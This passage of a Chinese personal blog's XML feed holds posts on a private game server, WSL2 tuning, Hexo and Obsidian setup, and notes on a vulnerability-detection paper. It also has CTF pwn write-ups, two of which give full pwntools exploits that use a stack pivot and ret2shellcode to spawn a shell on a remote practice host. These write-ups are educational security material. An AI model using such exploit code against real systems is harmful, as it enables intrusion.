5（全部SSS级）</span><br><span class="line">-----------------</span><br><span class="line">give &lt;avatars|weapons|stigmata|materials|dress&gt;.</span><br><span class="line">获取所有角色， 、武器、徽章、材料或服装</span><br><span class="line">例如:</span><br><span class="line">give avatars（全部角色）</span><br><span class="line">give weapons（全部武器）</span><br><span class="line">give stigmata（全部圣痕）</span><br><span class="line">give materials（全部材料）危险操作</span><br><span class="line">give dress（全部衣服）</span><br><span class="line">give material-id 100 5（给id为5的物品加100个）</span><br><span class="line">give gold 999999（加金币）</span><br><span class="line">-----------------</span><br><span class="line">  give    avatars   weapons  stigmata  dress   materials</span><br><span class="line">获取所有    角色       武器      徽章    服装      材料（可能会炸存档，不建议使用）</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<h3 id="删库重开"><a href="#删库重开" class="headerlink" title="删库重开"></a>删库重开</h3><p>删除mongod的<code>data</code>目录中所有内容即可。</p>
<h3 id="更新cg动画为中文"><a href="#更新cg动画为中文" class="headerlink" title="更新cg动画为中文"></a>更新cg动画为中文</h3><p>找国服的Video重命名后替换即可</p>
<h3 id="解包图片等资源"><a href="#解包图片等资源" class="headerlink" title="解包图片等资源"></a>解包图片等资源</h3><p>使用<a href="https://github.com/RazTools/Studio">AssetStudio</a>工具来提取.&#x2F;StreamingAssets&#x2F;Asb&#x2F;pc中的wmv数据。</p>
]]></content>
      <categories>
        <category>PemukulPaku</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2优化</title>
    <url>/posts/b3366d9a.html</url>
    <content><![CDATA[<p>将WSL2的一些优化过程记录在这里（在想这些优化类的要么搞个分类，要么搞个时间轴，可能效果会更好）</p>
<h2 id="终端美化"><a href="#终端美化" class="headerlink" title="终端美化"></a>终端美化</h2><p>不想多说啥，</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 安装oh-my-zsh</li>
<li><input checked="" disabled="" type="checkbox"> 配置power10k主题，命令高亮和自动补全插件</li>
<li><input checked="" disabled="" type="checkbox"> 安装JetBrains Mono字体</li>
</ul>
<h2 id="磁盘占用优化"><a href="#磁盘占用优化" class="headerlink" title="磁盘占用优化"></a>磁盘占用优化</h2><p>参考链接：</p>
<ul>
<li><a href="https://devblogs.microsoft.com/commandline/windows-subsystem-for-linux-september-2023-update/#automatic-disk-space-clean-up-set-sparse-vhd">Windows Subsystem for Linux September 2023 update</a></li>
<li><a href="https://superuser.com/questions/1827953/reclaim-wsl2-disk-space-after-setting-it-to-sparse">Reclaim WSL2 disk space after setting it to sparse</a></li>
</ul>
<p>日常使用WSL时，随着文件的不断创建与删除，WSL虚拟磁盘的体积会逐渐增大，甚至在删除文件后磁盘空间不会减小（笔者在最近几周频繁使用，直接从二十G翻倍到四十G~）。通过开启<strong>Sparse VHD</strong>（稀疏VHD）的方法，来使虚拟磁盘自动释放未使用的空间。</p>
<h3 id="启用Sparse-VHD功能"><a href="#启用Sparse-VHD功能" class="headerlink" title="启用Sparse VHD功能"></a>启用Sparse VHD功能</h3><ol>
<li><p><strong>编辑<code>.wslconfig</code>文件</strong>（在windows用户主目录下，没有的话需要创建），添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">sparseVhd=true</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭WSL</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
</li>
<li><p>为指定WSL发行版启用Sparse VHD</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --manage ubuntu22.04 --set-sparse true</span><br></pre></td></tr></table></figure>

<p>该命令只需运行一次，之后会默认保持启用状态。</p>
</li>
</ol>
<p>如果发现ext4.vhdx没有减小，则需要手动压缩磁盘（管理员运行powershell）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> false</span><br><span class="line"><span class="built_in">optimize-vhd</span> <span class="literal">-Path</span> &lt;path<span class="literal">-to-your-vhdx</span>&gt;.vhdx <span class="literal">-Mode</span> full</span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> true</span><br></pre></td></tr></table></figure>



<h3 id="验证功能是否启用"><a href="#验证功能是否启用" class="headerlink" title="验证功能是否启用"></a>验证功能是否启用</h3><p>检查WSL磁盘文件（<code>ext4.vhdx</code>）是否减小</p>
<p>文件通常路径：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;YourUsername&gt;\AppData\Local\Packages\&lt;DistroPackage&gt;\LocalState\ext4.vhdx</span><br></pre></td></tr></table></figure>

<p><strong>启动前</strong></p>
<img src="/posts/b3366d9a/image-20241111102727466.png" class="" title="image-20241111102727466">

<p><strong>启动后</strong></p>
<img src="/posts/b3366d9a/image-20241111104042189.png" class="" title="image-20241111104042189">

<h2 id="扩大内存"><a href="#扩大内存" class="headerlink" title="扩大内存"></a>扩大内存</h2><p>参考链接：<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-setting-for-wslconfig">Advanced settings configuration in WSL</a></p>
<p>WSL2默认只占用windows的一半内存，这里扩展到100%</p>
<p>编辑<code>.wslconfig</code>，添加以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">memory=32GB</span><br></pre></td></tr></table></figure>

<p>然后重启WSL2即可</p>
<h2 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h2><p> 拿到Windows网关ip，将ALL_PROXY环境变量设置为对应Windows主机ip+Windows主机上的梯子端口号即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">host_ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;)</span><br><span class="line">export ALL_PROXY=&quot;http://$host_ip:7890&quot;</span><br><span class="line">echo &quot;ALL_PROXY was set to http://$host_ip:7890&quot;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo与Typora图片路径统一</title>
    <url>/posts/102fc9fc.html</url>
    <content><![CDATA[<p>由于Typora和Hexo的默认图片存储路径不同，导致Hexo每次部署都需要手动修改图片路径，之后使用Typora本地查看也很不方便，因此在此记录下修改过程。</p>
<h2 id="安装插件hexo-image-link"><a href="#安装插件hexo-image-link" class="headerlink" title="安装插件hexo-image-link"></a>安装插件hexo-image-link</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-image-link --save</span><br></pre></td></tr></table></figure>

<h2 id="打开Hexo资源管理配置开关"><a href="#打开Hexo资源管理配置开关" class="headerlink" title="打开Hexo资源管理配置开关"></a>打开Hexo资源管理配置开关</h2><p>打开<code>_config.yml</code>文件</p>
<p>修改内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="修改Typora默认图片存储路径"><a href="#修改Typora默认图片存储路径" class="headerlink" title="修改Typora默认图片存储路径"></a>修改Typora默认图片存储路径</h2><p>修改Typora图片默认存储路径：</p>
<img src="/posts/102fc9fc/image-20241121144430246.png" class="" title="image-20241121144430246">

<p>这样Hexo和Typora两个的图片读取路径就会一致。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Obsidian+Hexo使用</title>
    <url>/posts/f1534c51.html</url>
    <content><![CDATA[<p>使用obsidian来管理博客，记录搭建的过程</p>
<h2 id="使用Obsidian的一些优势"><a href="#使用Obsidian的一些优势" class="headerlink" title="使用Obsidian的一些优势"></a>使用Obsidian的一些优势</h2><ol>
<li>方便管理</li>
<li>支持创建Front-Matter模版</li>
<li>支持内链</li>
</ol>
<h2 id="Obsidian内链"><a href="#Obsidian内链" class="headerlink" title="Obsidian内链"></a>Obsidian内链</h2><p>安装<a href="https://github.com/Cyrusky/hexo-backlink">Hexo-Backlink</a>插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-backlink</span><br></pre></td></tr></table></figure>

<p>在<code>_config.yaml</code>中添加<code>backlink:true</code>字段。</p>
<p>在obsidian中设置：<br>“设置” -&gt; “文件与链接” -&gt; “内部链接类型” , 设置为 “基于当前笔记的相对路径”<br>“设置” -&gt; “文件与链接” -&gt; “使用WIKI链接” , 打开</p>
<h3 id="问题解决-1：反向链接"><a href="#问题解决-1：反向链接" class="headerlink" title="问题解决 1：反向链接"></a>问题解决 1：反向链接</h3><p>研究了一下backlink这个插件，发现之前有人提过一个<a href="https://github.com/Cyrusky/hexo-backlink/issues/10">issue</a>，提到post文件名如果有日期格式的话插件就会报错，如果去掉只剩title就可以正常运行。  经验证目前应该仍然存在这个问题。</p>
<p>修改了下hexo-backlink源码的逻辑，上传到github上了<a href="https://github.com/Eknight-Eutopia/hexo-backlink/blob/main/src/index.ts">Eknight-Eutopia&#x2F;hexo-backlink</a></p>
<p>可以根据以上内容修改hexo博客里node_modules的hexo-backlink&#x2F;index.js的action函数<br>主要修改是添加了对日期的识别，如果为日期格式则只匹配其中的title（也就是说如果后续改title但没改文件名的话应该也是有问题的），这样基本上是可以使用的。<br>另外，看github上作者近期也没有更新，所以直接修改node_modules其实也不需要担心后面升级被覆盖了~~~</p>
<h3 id="问题解决2：模版渲染"><a href="#问题解决2：模版渲染" class="headerlink" title="问题解决2：模版渲染"></a>问题解决2：模版渲染</h3><p>在<code>_post</code>文件夹中创建了<code>Templates/templates_for_obsidian.md</code>来作为新建模版，但是后面每次启动hexo都会渲染该文件，导致自动为其设置了abbrlink，以至于后面所有的文件都是这个abbrlink，出现问题。</p>
<p>参考链接：<a href="https://hexo.io/zh-cn/docs/configuration#%E7%9B%AE%E5%BD%95">Hexo配置</a></p>
<p>禁止Hexo渲染模版文件即可：<br>在<code>_config.yml</code>中修改以下内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exclude template posts</span></span><br><span class="line"><span class="attr">skip_render:</span> <span class="string">&quot;_posts/Templates/*&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>BH3服务器开发与完善</title>
    <url>/posts/18d20718.html</url>
    <content><![CDATA[<h2 id="功能完善"><a href="#功能完善" class="headerlink" title="功能完善"></a>功能完善</h2><p>这部分的主要逻辑实现在GameServer目录中的Handlers中</p>
<h3 id="主线功能"><a href="#主线功能" class="headerlink" title="主线功能"></a>主线功能</h3><ul>
<li><a href="/posts/837b0a67.html" title="PemukulPaku-GetStageDataReqHandler">GetStageDataReq</a></li>
<li><a href="/posts/4eb70f95.html" title="PemukulPaku-StageEndRspHandler">StageEndRsp</a></li>
<li><a href="/posts/f6185e2f.html" title="PemukulPaku-TakeStageActChallengeRewardReqHandler">TakeStageActChallengeRewardReq</a></li>
<li><a href="/posts/edbf9f10.html" title="PemukulPaku-GetStageChapterReqHandler">GetStageChapterReq</a></li>
<li>FinishGuideReportReq</li>
<li>UpdateMissionProgressReq</li>
<li><a href="/posts/7a44cc62.html" title="PemukulPaku-GetStageDropDisplayReqHandler">GetStageDropDisplayReq</a></li>
</ul>
<h3 id="人物功能"><a href="#人物功能" class="headerlink" title="人物功能"></a>人物功能</h3><ul>
<li><a href="/posts/1b7a2e3d.html" title="PemukulPaku-AvatarStarUpReq">AvatarStarUpReq</a></li>
<li><a href="/posts/902f2cb2.html" title="PemukulPaku-AvatarFragmentTransformReq">AvatarFragmentTransformReq</a></li>
</ul>
<h3 id="材料装备功能"><a href="#材料装备功能" class="headerlink" title="材料装备功能"></a>材料装备功能</h3><ul>
<li><a href="/posts/2a86d11c.html" title="PemukulPaku-EquipmentSellReqHandler">EquipmentSellReq</a></li>
<li><a href="/posts/8fbda5e4.html" title="PemukulPaku-IslandDisjoinEquipmentReqHandler">IslandDisjoinEquipmentReq</a></li>
<li><a href="/posts/783a5418.html" title="PemukulPaku-EquipmentEvoReqHandler">EquipmentEvoReq</a></li>
<li><a href="/posts/7c3da2f0.html" title="PemukulPaku-GetEquipmentForgeDataReq">PemukulPaku-GetEquipmentForgeDataReq</a></li>
<li><a href="/posts/fcfb0211.html" title="PemukukPaku-ForgeEquipmentReq">ForgeEquipmentReq</a></li>
</ul>
<h3 id="商店与充值功能"><a href="#商店与充值功能" class="headerlink" title="商店与充值功能"></a>商店与充值功能</h3><ul>
<li><a href="/posts/6b761fa9.html" title="GetShopListReq">GetShopListReq</a></li>
<li><a href="/posts/308d4464.html" title="PemukulPaku-BuyGoodsReqHandler">BuyGoodsReq</a></li>
<li><a href="/posts/8bee2b6e.html" title="PemukulPaku-GetProductListReqHandler">GetProductListReq</a></li>
<li><a href="/posts/dc044fb2.html" title="PemukulPaku-BuyProductReq">BuyProductReq</a></li>
<li><a href="/posts/8063f392.html" title="PemukulPaku-GetShoppingMallListReqHandler">GetShoppingMallListReq</a></li>
<li><a href="/posts/10d8291a.html" title="PemukulPaku-GetVipRewardDataReq">GetVipRewardData</a></li>
<li><a href="/posts/3292b628.html" title="PemukulPaku-GetVipRewardReqHandler">GetVipRewardReq</a></li>
</ul>
<h3 id="深渊功能"><a href="#深渊功能" class="headerlink" title="深渊功能"></a>深渊功能</h3><ul>
<li><a href="/posts/ddb0d42f.html" title="PemukulPaku-GetMissionRewardReqHandler">GetMissionRewardReq</a></li>
</ul>
<h3 id="抽卡功能"><a href="#抽卡功能" class="headerlink" title="抽卡功能"></a>抽卡功能</h3><ul>
<li><a href="/posts/916f0cfe.html" title="GachaReqHandler">GachaReq</a></li>
<li><a href="/posts/c87482d2.html" title="GetGachaDisplayReq">GetGachaDisplayReq</a></li>
</ul>
<h3 id="日常功能"><a href="#日常功能" class="headerlink" title="日常功能"></a>日常功能</h3><ul>
<li>LoginWishGetMainDataReq(每日登录领取奖励)</li>
<li><a href="/posts/7a0445a.html" title="PemukulPaku-GetSignInRewardStatusReq">GetSignInRewardStatusReq</a></li>
<li>GetWeeklyRoutineActivityReq</li>
<li><a href="/posts/788ed292.html" title="PemukulPaku-GetInviteActivityInviteeDataReq">GetInviteActivityInviterDataReq</a></li>
<li><a href="/posts/ef0eaa0.html" title="PemukulPaku-GetInviteActivityInviterDataReq">GetInviteActivityInviterDataReq</a></li>
</ul>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul>
<li>GetHasGotItemIdListReq</li>
<li>GetArmadaDataReq(舰团)</li>
</ul>
]]></content>
      <categories>
        <category>PemukulPaku</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>LARA论文阅读笔记</title>
    <url>/posts/e3c41b31.html</url>
    <content><![CDATA[<h2 id="论文概述"><a href="#论文概述" class="headerlink" title="论文概述"></a>论文概述</h2><p><a href="https://www.usenix.org/system/files/usenixsecurity24-zhao.pdf">https://www.usenix.org/system/files/usenixsecurity24-zhao.pdf</a></p>
<p>（SaTC + 大模型）：使用污点分析技术来检测嵌入式系统漏洞的方法</p>
<img src="/posts/e3c41b31/file-20241217200349708.png" class="" title="file-20241217200349708">
<h2 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h2><ul>
<li>嵌入式固件中代码（<strong>输入处理函数</strong>）与数据（<strong>URI，KEY</strong>）的<strong>语义联系</strong>有助于识别污点分析的source点</li>
<li>将用户输入条目分为URI和KEY两类，并进行两类的mapping工作，有助于发现隐藏的URI和KEY<ul>
<li>关系图：<img src="/posts/e3c41b31/file-20241217204623878.png" class="" title="file-20241217204623878">
<ul>
<li>提取：先从前端获取一部分，然后在后端识别URI或KEY处理代码，再扩展</li>
</ul>
</li>
</ul>
</li>
<li>分为两个模块：<ul>
<li>pattern-based静态分析</li>
<li>LLM辅助分析：代码语义分析（大模型在总结代码语义上有很好的效果）</li>
<li>（sink点提取）</li>
</ul>
</li>
</ul>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
<li>添加大模型，通过语义理解的方式来辅助判断，显著提升了关键字识别的准确率</li>
<li>降低了漏洞检测假阳率</li>
<li>大模型与基于pattern匹配两种模式的结合</li>
<li>URI、KEY分离的思想</li>
</ul>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>203个设备，21个厂商<br>相较于SaTC，KARONTE分别多发现了556，602个漏洞，降低假阳率57.0%，54.3%</p>
<p>57个设备中发现了245个0-day，162个CVE</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>【ciscn_2019_es_2】WriteUp</title>
    <url>/posts/d92ba103.html</url>
    <content><![CDATA[<p><code>checksec</code>一下，发现只有NX防护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn11/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>使用ida打开，发现s存在溢出漏洞，但是只能溢出8字节，无法调用write等函数进行RetLibc。因此考虑栈迁移。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈迁移指在rbp指向的地址写入要篡改的地址，rbp+4写入leave_ret地址，这样在函数正常结束即将返回时，rsp指向rbp，rbp指向rbp指向的内容地址，rsp+4到leave_ret，使eip指向了leave_ret，因此导致程序又执行了leave_ret，再次将rsp移动到rbp，rsp+4，使eip指向了篡改地址+4的地址。</p>
<img src="/posts/d92ba103/%E6%A0%88%E8%BF%81%E7%A7%BB-1.png" class="" title="栈迁移-1">

<img src="/posts/d92ba103/%E6%A0%88%E8%BF%81%E7%A7%BB-2.png" class="" title="栈迁移-2">

<p>因此只需要向程序变量s写入要执行的指令，再栈迁移使eip指向s即可。</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080485BE&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27006</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出泄漏ebp地址，用于栈迁移</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，进行栈迁移，通过修改ebp来达到修改eip的目的 </span></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;aaaa&#x27;</span>, system_addr, <span class="number">0</span>, ebp_addr-<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(ebp_addr-<span class="number">0x38</span>, leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>【ez_pz_hackover_2016】WriteUp</title>
    <url>/posts/478cb6ca.html</url>
    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Ret2Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>【babyheap_0ctf_2017】WriteUp</title>
    <url>/posts/d4f04a55.html</url>
    <content><![CDATA[<p><code>checksec</code>查看，保护全开，可以查看是否有堆的漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn18/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>ida查看：</p>
<p><code>main</code>函数提供了菜单以及选择功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        Allocate(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        Fill(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>allocate</code>函数根据大小申请堆空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Allocate</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Fill</code>函数向指定index堆块写入内容，注意此处没有对大小进行限制，因此可以考虑fastbin attack劫持</p>
